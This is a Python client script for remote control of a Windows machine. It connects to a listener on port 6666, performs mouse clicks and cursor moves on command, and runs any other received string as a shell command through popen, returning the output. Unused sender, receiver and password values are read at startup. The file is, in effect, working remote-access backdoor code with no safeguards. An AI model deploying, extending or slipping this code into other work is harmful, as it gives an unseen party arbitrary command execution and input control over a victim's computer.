from socket import *
import win32api,win32con
import time
import re
from os import popen
#客户端接收执行命令

result = ''

c=socket(AF_INET,SOCK_STREAM)#IVP4 寻址  tcp协议
c.connect(('127.0.0.1',6666))#连接地址

def leftmouse_down():
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)

def leftmouse_up():
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)

def leftmouse_click():
    leftmouse_down()
    leftmouse_up()

def rightmouse_down():
    win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)

def rightmouse_up():
    win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)

def rightmouse_click():
    rightmouse_down()
    rightmouse_up()

key_map = {
    "0": 49, "1": 50, "2": 51, "3": 52, "4": 53, "5": 54, "6": 55, "7": 56, "8": 57, "9": 58,
    "A": 65, "B": 66, "C": 67, "D": 68, "E": 69, "F": 70, "G": 71, "H": 72, "I": 73, "J": 74,
    "K": 75, "L": 76, "M": 77, "N": 78, "O": 79, "P": 80, "Q": 81, "R": 82, "S": 83, "T": 84,
    "U": 85, "V": 86, "W": 87, "X": 88, "Y": 89, "Z": 90
}

def key_down(key):
    key = key.upper()
    vk_code = key_map[key]
    win32api.keybd_event(vk_code,win32api.MapVirtualKey(vk_code,0),0,0)

def key_up(key):
    key = key.upper()
    vk_code = key_map[key]
    win32api.keybd_event(vk_code, win32api.MapVirtualKey(vk_code, 0), win32con.KEYEVENTF_KEYUP, 0)
 
 
def key_press(key):
    key_down(key)
    time.sleep(0.02)
    key_up(key)

def mousemove(attribute):
    win32api.SetCursorPos(attribute)

def check_command(cmdstr):
    global result

    if cmdstr == 'leftmouse_click':
        try:
            leftmouse_click()
            result = '[+] success'
            return True

        except:
            result = '[-] failed'
            return False
        
    if cmdstr == 'rightmouse_click':
        try:
            rightmouse_click()
            result = '[+] success'
            return True
        except:
            result = '[-] failed'
            return False

    if re.match(r'mousemove',cmdstr):
        lenth = int(re.findall(r'\d+',cmdstr)[0])
        higth = int(re.findall(r'\d+',cmdstr)[1])
        attribute = lenth,higth
        try:
            mousemove(attribute)
            result = '[+] success'
            return True
        except:
            result = '[-] failed'
            return False

if __name__ == '__main__':

    sender = c.recv(1024).decode()

    receiver = c.recv(1024).decode()
    receivers = []
    receivers.append(receiver)

    password = c.recv(1024).decode()



    while True:

        cmd=c.recv(10240)
        cmdstr=cmd.decode()

        if check_command(cmdstr):
            pass


        #if cmdstr == 'exit':
        #    c.close()
        #    break
    
        else:
            try:
                result=popen(cmdstr).read()
                if result == '':
                    result='[-] ERROR_COMMAND'
            except:
                result='[-] ERROR_COMMAND'

        c.send(result.encode())
